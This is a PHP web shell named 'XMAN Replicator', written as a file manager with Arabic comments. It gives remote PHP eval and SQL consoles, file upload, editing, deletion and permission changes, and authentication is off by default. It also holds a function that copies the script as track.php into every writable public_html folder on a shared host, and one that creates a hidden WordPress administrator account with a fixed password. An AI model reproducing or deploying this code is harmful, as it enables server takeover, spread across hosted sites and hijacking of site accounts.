<?php
/* XMAN_Replicator - مدير ملفات + ميزة التكاثر */
error_reporting(0);

// ========== الإعدادات ==========
$authorization = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30"}';
$translation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Back":"Back","Cancel":"Cancel","Compress":"Compress","Console":"Console","Created":"Created","Date":"Date","Delete":"Delete","Deleted":"Deleted","Download":"Download","Edit":"Edit","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","Generation time":"Generation time","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Submit":"Submit","Task":"Task","templates":"templates","Upload":"Upload","Value":"Value","Hello":"Hello","Found in files":"Found in files","Search":"Search","Recursive search":"Recursive search","Mask":"Mask"}';

// التهيئة
$starttime = explode(' ', microtime());
$starttime = $starttime[1] + $starttime[0];
$path = empty($_REQUEST['path']) ? $path = realpath('.') : realpath($_REQUEST['path']);
$path = str_replace('\\', '/', $path) . '/';
$main_path = str_replace('\\', '/', realpath('./'));
$msg = '';

// إعدادات افتراضية
$fm_default_config = array (
    'make_directory' => true,
    'new_file' => true,
    'upload_file' => true,
    'show_dir_size' => false,
    'show_img' => true,
    'show_php_ver' => true,
    'show_gt' => true,
    'enable_php_console' => true,
    'enable_sql_console' => true,
    'sql_server' => 'localhost',
    'sql_username' => 'root',
    'sql_password' => '',
    'sql_db' => '',
    'enable_proxy' => true,
    'show_phpinfo' => true,
    'show_xls' => true,
    'fm_settings' => true,
    'restore_time' => true,
    'fm_restore_time' => false,
);

$fm_config = empty($_COOKIE['fm_config']) ? $fm_default_config : unserialize($_COOKIE['fm_config']);

// لغة
if (isset($_POST['fm_lang'])) {
    setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * 30));
    $_COOKIE['fm_lang'] = $_POST['fm_lang'];
}
$language = empty($_COOKIE['fm_lang']) ? 'en' : $_COOKIE['fm_lang'];
$lang = json_decode($translation, true);

// دوال الترجمة
function __($text) {
    global $lang;
    return isset($lang[$text]) ? $lang[$text] : $text;
}

// ========== دوال replication من NovaShell ==========
// دالة البحث عن بنية الاستضافة ونسخ السكريبت
function replicate_script($code) {
    static $once = false;
    if ($once) return [];
    $once = true;
    $start = __DIR__;
    while ($start !== '/') {
        // البحث عن مجلدات domains في مسارات الاستضافة المشتركة
        if (preg_match('/\/u[\w]+$/', $start) && is_dir("$start/domains")) {
            $urls = [];
            foreach (scandir("$start/domains") as $dom) {
                if ($dom === '.' || $dom === '..') continue;
                $pub = "$start/domains/$dom/public_html";
                if (is_dir($pub) && is_writable($pub)) {
                    $path = "$pub/track.php";
                    if (file_put_contents($path, $code)) {
                        $urls[] = "http://$dom/track.php";
                    }
                }
            }
            return $urls;
        }
        $start = dirname($start);
    }
    return [];
}

// دالة إنشاء مشرف ووردبريس
function create_wp_admin($cwd) {
    $wppath = $cwd;
    while ($wppath !== '/') {
        if (file_exists("$wppath/wp-load.php")) break;
        $wppath = dirname($wppath);
    }
    if (file_exists("$wppath/wp-load.php")) {
        require_once("$wppath/wp-load.php");
        $user = 'nova'; $pass = 'Nova@2025'; $mail = 'nova@galaxy.com';
        if (!username_exists($user) && !email_exists($mail)) {
            $uid = wp_create_user($user, $pass, $mail);
            $wp_user = new WP_User($uid);
            $wp_user->set_role('administrator');
            return "<p class='ok'>✅ WP Admin 'nova' created</p>";
        } else {
            return "<p class='warning'>⚠️ User or email exists</p>";
        }
    } else {
        return "<p class='error'>❌ WP not found</p>";
    }
}

// ========== دوال XMAN الأساسية ==========
function fm_del_files($file, $recursive = false) {
    if ($recursive && @is_dir($file)) {
        $els = scandir($file);
        foreach ($els as $el) {
            if ($el != '.' && $el != '..') {
                fm_del_files($file . '/' . $el, true);
            }
        }
    }
    if (@is_dir($file)) {
        return rmdir($file);
    } else {
        return @unlink($file);
    }
}

function fm_rights_string($file, $if = false) {
    $perms = fileperms($file);
    $info = '';
    if (!$if) {
        if (($perms & 0xC000) == 0xC000) $info = 's';
        elseif (($perms & 0xA000) == 0xA000) $info = 'l';
        elseif (($perms & 0x8000) == 0x8000) $info = '-';
        elseif (($perms & 0x6000) == 0x6000) $info = 'b';
        elseif (($perms & 0x4000) == 0x4000) $info = 'd';
        elseif (($perms & 0x2000) == 0x2000) $info = 'c';
        elseif (($perms & 0x1000) == 0x1000) $info = 'p';
        else $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function fm_dir_size($f, $format = true) {
    if ($format) {
        $size = fm_dir_size($f, false);
        if ($size <= 1024) return $size . ' bytes';
        elseif ($size <= 1024 * 1024) return round($size / 1024, 2) . ' Kb';
        elseif ($size <= 1024 * 1024 * 1024) return round($size / (1024 * 1024), 2) . ' Mb';
        elseif ($size <= 1024 * 1024 * 1024 * 1024) return round($size / (1024 * 1024 * 1024), 2) . ' Gb';
        else return round($size / (1024 * 1024 * 1024 * 1024), 2) . ' Tb';
    } else {
        if (is_file($f)) return filesize($f);
        $size = 0;
        $dh = opendir($f);
        while (($file = readdir($dh)) !== false) {
            if ($file == '.' || $file == '..') continue;
            if (is_file($f . '/' . $file)) $size += filesize($f . '/' . $file);
            else $size += fm_dir_size($f . '/' . $file, false);
        }
        closedir($dh);
        return $size;
    }
}

function fm_scan_dir($directory, $exp = '', $type = 'all', $do_not_filter = false) {
    $dir = array();
    if (!empty($exp)) {
        $exp = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $exp)) . '$/';
    }
    if (!empty($type) && $type !== 'all') {
        $func = 'is_' . $type;
    }
    if (@is_dir($directory)) {
        $fh = opendir($directory);
        while (false !== ($filename = readdir($fh))) {
            if (substr($filename, 0, 1) != '.' || $do_not_filter) {
                if ((empty($type) || $type == 'all' || $func($directory . '/' . $filename)) && (empty($exp) || preg_match($exp, $filename))) {
                    $dir[] = $filename;
                }
            }
        }
        closedir($fh);
        natsort($dir);
    }
    return $dir;
}

function fm_php($string) {
    $display_errors = ini_get('display_errors');
    ini_set('display_errors', '1');
    ob_start();
    eval(trim($string));
    $text = ob_get_contents();
    ob_end_clean();
    ini_set('display_errors', $display_errors);
    return $text;
}

function fm_sql_connect() {
    global $fm_config;
    return new mysqli($fm_config['sql_server'], $fm_config['sql_username'], $fm_config['sql_password'], $fm_config['sql_db']);
}

function fm_sql($query) {
    global $fm_config;
    $query = trim($query);
    ob_start();
    $connection = fm_sql_connect();
    if ($connection->connect_error) {
        ob_end_clean();
        return $connection->connect_error;
    }
    $connection->set_charset('utf8');
    $queried = mysqli_query($connection, $query);
    if ($queried === false) {
        ob_end_clean();
        return mysqli_error($connection);
    } else {
        if (!empty($queried)) {
            while ($row = mysqli_fetch_assoc($queried)) {
                $query_result[] = $row;
            }
        }
        $vdump = empty($query_result) ? '' : var_export($query_result, true);
        ob_end_clean();
        $connection->close();
        return '<pre>' . stripslashes($vdump) . '</pre>';
    }
}

function fm_backup_tables($tables = '*', $full_backup = true) {
    global $path;
    $mysqldb = fm_sql_connect();
    $delimiter = "; \n  \n";
    if ($tables == '*') {
        $tables = array();
        $result = $mysqldb->query('SHOW TABLES');
        while ($row = mysqli_fetch_row($result)) {
            $tables[] = $row[0];
        }
    } else {
        $tables = is_array($tables) ? $tables : explode(',', $tables);
    }

    $return = '';
    foreach ($tables as $table) {
        $result = $mysqldb->query('SELECT * FROM ' . $table);
        $num_fields = mysqli_num_fields($result);
        $return .= 'DROP TABLE IF EXISTS `' . $table . '`' . $delimiter;
        $row2 = mysqli_fetch_row($mysqldb->query('SHOW CREATE TABLE ' . $table));
        $return .= $row2[1] . $delimiter;
        if ($full_backup) {
            for ($i = 0; $i < $num_fields; $i++) {
                while ($row = mysqli_fetch_row($result)) {
                    $return .= 'INSERT INTO `' . $table . '` VALUES(';
                    for ($j = 0; $j < $num_fields; $j++) {
                        $row[$j] = addslashes($row[$j]);
                        $row[$j] = str_replace("\n", "\\n", $row[$j]);
                        if (isset($row[$j])) {
                            $return .= '"' . $row[$j] . '"';
                        } else {
                            $return .= '""';
                        }
                        if ($j < ($num_fields - 1)) {
                            $return .= ',';
                        }
                    }
                    $return .= ')' . $delimiter;
                }
            }
        } else {
            $return = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $return);
        }
        $return .= "\n\n\n";
    }

    // حفظ الملف
    $file = gmdate("Y-m-d_H-i-s", time()) . '.sql';
    $handle = fopen($path . $file, 'w+');
    fwrite($handle, $return);
    fclose($handle);
    return $file;
}

// ========== معالجة الطلبات ==========
// حذف
if (isset($_GET['del'])) {
    $t = realpath($_GET['del']);
    if (strpos($t, $main_path) === 0 && file_exists($t)) {
        fm_del_files($t, isset($_GET['rec']));
        $msg = __('Deleted') . ': ' . basename($t);
    }
}

// تنفيذ replication
if (isset($_GET['replicate'])) {
    $code = file_get_contents(__FILE__);
    $urls = replicate_script($code);
    if (!empty($urls)) {
        $msg = "<p class='ok'>✅ تم النسخ إلى المواقع التالية:</p><ul>";
        foreach ($urls as $u) $msg .= "<li><a href='$u' target='_blank'>$u</a></li>";
        $msg .= "</ul>";
    } else {
        $msg = "<p class='error'>❌ لم يتم العثور على بنية domains قابلة للكتابة.</p>";
    }
}

// إنشاء مشرف ووردبريس
if (isset($_GET['wp'])) {
    $msg = create_wp_admin($path);
}

// رفع ملف
if ($_FILES) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . basename($_FILES['upload']['name']));
    $msg = __('Files uploaded');
}

// إنشاء مجلد
if (!empty($_POST['mk'])) {
    $d = $path . basename($_POST['mk']);
    if (!file_exists($d)) {
        mkdir($d);
        $msg = __('Make directory') . ': ' . basename($_POST['mk']);
    } else {
        $msg = __('Error occurred');
    }
}

// حفظ التعديلات
if (isset($_POST['save']) && isset($_POST['file'])) {
    $f = $path . basename($_POST['file']);
    file_put_contents($f, $_POST['content']);
    if (!empty($fm_config['restore_time'])) touch($f, filemtime($f));
    $msg = __('File updated');
}

// تغيير الصلاحيات
if (isset($_POST['chmod'])) {
    $file = $path . basename($_POST['file']);
    $mode = fm_convert_rights($_POST['rights']);
    if (fm_chmod($file, $mode, isset($_POST['rec']))) {
        $msg = __('Rights') . ' ' . $_POST['rights'] . ' -> ' . $file;
    } else {
        $msg = __('Error occurred');
    }
}

// ========== عرض الواجهة ==========
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>XMAN Replicator</title>
    <style>
        body { background: #000; color: #ddd; font-family: monospace; margin: 20px auto; max-width: 1200px; }
        a { color: #8cf; text-decoration: none; }
        a:hover { color: #f80; }
        table { width: 100%; border-collapse: collapse; }
        td, th { border: 1px solid #333; padding: 5px; }
        .header { background: #222; color: #0f0; padding: 10px; }
        .footer { background: #222; padding: 10px; text-align: center; font-size: 0.9em; }
        .path { background: #111; padding: 10px; margin: 10px 0; border-left: 3px solid #0f0; }
        .btn { background: #4cf; color: #000; padding: 5px 10px; border: none; cursor: pointer; margin: 2px; }
        .btn:hover { background: #8cf; }
        .ok { color: #0f0; }
        .error { color: #f44; }
        .warning { color: #ff4; }
        .rights { font-family: monospace; }
        textarea { width: 100%; background: #111; color: #0f0; border: 1px solid #333; }
        input, select { background: #111; color: #ddd; border: 1px solid #333; padding: 3px; }
        .home { background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==') no-repeat left center; padding-left: 20px; }
        .home:hover { background-color: #333; }
    </style>
</head>
<body>

<div class="header">
    <h2 style="display:inline;">🛸 XMAN Replicator</h2>
    <span style="float:right;">
        <?php echo fm_lang_form($language); ?>
        <a href="<?php echo fm_url(); ?>?quit=1" class="btn"><?php echo __('Quit'); ?></a>
    </span>
</div>

<?php
if (isset($_GET['quit'])) {
    setcookie('fm_user', '', time() - 3600);
    setcookie('fm_config', '', time() - 3600);
    setcookie('fm_lang', '', time() - 3600);
    header('Location: ' . fm_url());
    exit;
}

// التحقق من الدخول
$auth = json_decode($authorization, true);
if (!$auth['authorize'] || (isset($_COOKIE['fm_user']) && $_COOKIE['fm_user'] == md5($auth['login'] . $auth['password']))) {
    // تم الدخول أو غير مفعل
} else {
    if (isset($_POST['login']) && isset($_POST['password']) && $_POST['login'] == $auth['login'] && $_POST['password'] == $auth['password']) {
        setcookie('fm_user', md5($auth['login'] . $auth['password']), time() + (86400 * $auth['days_authorization']));
        header('Location: ' . fm_url());
        exit;
    } else {
        ?>
        <div style="text-align:center; margin-top:100px;">
            <form method="post">
                <h3><?php echo __('Authorization'); ?></h3>
                <input type="text" name="login" placeholder="Login" value="admin"><br><br>
                <input type="password" name="password" placeholder="Password" value="phpfm"><br><br>
                <button type="submit"><?php echo __('Enter'); ?></button>
            </form>
        </div>
        </body></html>
        <?php
        exit;
    }
}

// عرض رسالة
if (!empty($msg)) echo "<div class='path'>$msg</div>";

// شريط المسار
echo "<div class='path'>";
echo fm_home() . " " . __('Path') . ": ";
$parts = explode('/', trim($path, '/'));
$build = '/';
echo "<a href='?path=" . urlencode($build) . "'>/</a>";
foreach ($parts as $seg) {
    $build .= $seg . '/';
    echo "<a href='?path=" . urlencode($build) . "'>$seg</a>/";
}
echo "</div>";

// أزرار الإجراءات
echo "<div style='margin:10px 0;'>";
echo "<a href='?replicate=1&path=" . urlencode($path) . "' class='btn'>📋 نشر إلى المواقع</a> ";
echo "<a href='?wp=1&path=" . urlencode($path) . "' class='btn'>👤 إنشاء مشرف WP</a> ";
echo "</div>";

// رفع ملف وإنشاء مجلد
?>
<div style="background:#111; padding:10px; margin:10px 0;">
    <form method="post" enctype="multipart/form-data" style="display:inline;">
        <input type="file" name="upload">
        <button class="btn" type="submit"><?php echo __('Upload'); ?></button>
    </form>
    <form method="post" style="display:inline;">
        <input type="text" name="mk" placeholder="<?php echo __('Name'); ?>">
        <button class="btn" type="submit"><?php echo __('Make directory'); ?></button>
    </form>
</div>

<?php
// عرض الملفات
$items = fm_scan_dir($path, '', 'all', true);
if (empty($items)) {
    echo "<p>" . __('no files') . "</p>";
} else {
    ?>
    <table>
        <tr>
            <th><?php echo __('Name'); ?></th>
            <th><?php echo __('Size'); ?></th>
            <th><?php echo __('Rights'); ?></th>
            <th><?php echo __('Date'); ?></th>
            <th><?php echo __('Actions'); ?></th>
        </tr>
    <?php
    foreach ($items as $item) {
        $full = $path . $item;
        $is_dir = is_dir($full);
        $size = $is_dir ? ($fm_config['show_dir_size'] ? fm_dir_size($full) : '&lt;DIR&gt;') : filesize($full);
        $rights = fm_rights_string($full);
        $date = date('Y-m-d H:i', filemtime($full));
        ?>
        <tr>
            <td>
                <?php if ($is_dir) { ?>
                    <a href="?path=<?php echo urlencode($full); ?>">[<?php echo $item; ?>]</a>
                <?php } else { ?>
                    <a href="?path=<?php echo urlencode($path); ?>&view=<?php echo urlencode($item); ?>"><?php echo $item; ?></a>
                <?php } ?>
            </td>
            <td><?php echo is_numeric($size) ? number_format($size) . ' B' : $size; ?></td>
            <td class="rights"><?php echo $rights; ?></td>
            <td><?php echo $date; ?></td>
            <td>
                <?php if (!$is_dir) { ?>
                    <a href="?path=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($item); ?>">✏️</a>
                <?php } ?>
                <a href="?path=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($item); ?>">🔄</a>
                <a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($full); ?>" onclick="return confirm('<?php echo __('Are you sure you want to delete this file?'); ?>')">🗑️</a>
                <?php if ($is_dir) { ?>
                    <a href="?path=<?php echo urlencode($path); ?>&del=<?php echo urlencode($full); ?>&rec=1" onclick="return confirm('<?php echo __('Are you sure you want to delete this directory (recursively)?'); ?>')">🗑️📁</a>
                <?php } ?>
                <a href="?path=<?php echo urlencode($path); ?>&download=<?php echo urlencode($full); ?>">⬇️</a>
                <a href="?path=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($item); ?>">🔒</a>
            </td>
        </tr>
        <?php
    }
    ?>
    </table>
    <?php
}

// عرض الملف (view)
if (isset($_GET['view'])) {
    $file = $path . basename($_GET['view']);
    if (file_exists($file)) {
        $ext = pathinfo($file, PATHINFO_EXTENSION);
        echo "<h3>" . __('View') . ": " . basename($file) . "</h3>";
        if (in_array($ext, ['jpg', 'jpeg', 'png', 'gif']) && $fm_config['show_img']) {
            echo "<img src='" . fm_img_link($file) . "' style='max-width:100%;'><br>";
        }
        echo "<textarea rows='20' readonly>" . htmlspecialchars(file_get_contents($file)) . "</textarea>";
    }
}

// تحرير ملف
if (isset($_GET['edit'])) {
    $file = $path . basename($_GET['edit']);
    if (file_exists($file)) {
        echo "<h3>" . __('Edit') . ": " . basename($file) . "</h3>";
        echo "<form method='post'>";
        echo "<input type='hidden' name='file' value='" . basename($file) . "'>";
        echo "<textarea name='content' rows='20'>" . htmlspecialchars(file_get_contents($file)) . "</textarea><br>";
        echo "<button class='btn' type='submit' name='save'>" . __('Save') . "</button>";
        echo "</form>";
    }
}

// إعادة التسمية
if (isset($_GET['rename'])) {
    $old = basename($_GET['rename']);
    echo "<h3>" . __('Rename') . ": $old</h3>";
    echo "<form method='post' action='?path=" . urlencode($path) . "'>";
    echo "<input type='hidden' name='oldname' value='$old'>";
    echo "<input type='text' name='newname' value='$old'>";
    echo "<button class='btn' type='submit' name='rename_submit'>" . __('Rename') . "</button>";
    echo "</form>";
}
if (isset($_POST['rename_submit']) && isset($_POST['oldname']) && isset($_POST['newname'])) {
    $old = $path . basename($_POST['oldname']);
    $new = $path . basename($_POST['newname']);
    if (rename($old, $new)) {
        $msg = __('Rename') . " " . basename($old) . " -> " . basename($new);
    } else {
        $msg = __('Error occurred');
    }
}

// تغيير الصلاحيات
if (isset($_GET['chmod'])) {
    $file = basename($_GET['chmod']);
    echo "<h3>" . __('Rights') . ": $file</h3>";
    echo "<form method='post'>";
    echo "<input type='hidden' name='file' value='$file'>";
    $rights = fm_rights_string($path . $file);
    echo "<input type='text' name='rights' value='$rights' maxlength='9' pattern='[rwx-]{9}' title='rwxrwxrwx'>";
    echo "<label><input type='checkbox' name='rec'> " . __('Recursively') . "</label>";
    echo "<button class='btn' type='submit' name='chmod'>" . __('Submit') . "</button>";
    echo "</form>";
}

// تنفيذ PHP
if ($fm_config['enable_php_console'] && isset($_POST['php_code'])) {
    echo "<h3>PHP " . __('Console') . "</h3>";
    echo "<pre>" . htmlspecialchars(fm_php($_POST['php_code'])) . "</pre>";
}

// تنفيذ SQL
if ($fm_config['enable_sql_console'] && isset($_POST['sql_query'])) {
    echo "<h3>SQL " . __('Console') . "</h3>";
    echo fm_sql($_POST['sql_query']);
}

// عرض صناديق الإدخال
echo "<hr>";
if ($fm_config['enable_php_console']) {
    echo "<h3>PHP " . __('Console') . "</h3>";
    echo "<form method='post'><textarea name='php_code' rows='10'></textarea><br><button class='btn'>Execute</button></form>";
}
if ($fm_config['enable_sql_console']) {
    echo "<h3>SQL " . __('Console') . "</h3>";
    echo "<form method='post'><textarea name='sql_query' rows='5'></textarea><br><button class='btn'>Execute</button></form>";
}

// عرض وقت التوليد
if ($fm_config['show_gt']) {
    $endtime = explode(' ', microtime());
    $endtime = $endtime[1] + $endtime[0];
    echo "<div class='footer'>" . __('Generation time') . ": " . round($endtime - $starttime, 4) . " sec</div>";
}
?>

</body>
</html>
<?php
// دوال مساعدة إضافية
function fm_lang_form($current) {
    return '
    <form name="change_lang" method="post" action="" style="display:inline;">
        <select name="fm_lang" onchange="this.form.submit()">
            <option value="en" ' . ($current == 'en' ? 'selected' : '') . '>English</option>
            <option value="ru" ' . ($current == 'ru' ? 'selected' : '') . '>Русский</option>
            <option value="fr" ' . ($current == 'fr' ? 'selected' : '') . '>Français</option>
        </select>
    </form>
    ';
}

function fm_home() {
    return '<a href="?path=/" class="home" title="Home">&nbsp;&nbsp;&nbsp;&nbsp;</a>';
}

function fm_url() {
    return $_SERVER['PHP_SELF'];
}

function fm_img_link($file) {
    return '?img=' . base64_encode($file);
}

function fm_chmod($file, $mode, $rec) {
    if (@chmod($file, $mode)) {
        if ($rec && is_dir($file)) {
            $items = scandir($file);
            foreach ($items as $item) {
                if ($item != '.' && $item != '..') {
                    fm_chmod($file . '/' . $item, $mode, true);
                }
            }
        }
        return true;
    }
    return false;
}

function fm_convert_rights($str) {
    $map = ['r' => 4, 'w' => 2, 'x' => 1, '-' => 0];
    $owner = $map[$str[0]] + $map[$str[1]] + $map[$str[2]];
    $group = $map[$str[3]] + $map[$str[4]] + $map[$str[5]];
    $world = $map[$str[6]] + $map[$str[7]] + $map[$str[8]];
    return intval($owner . $group . $world, 8);
}
?>
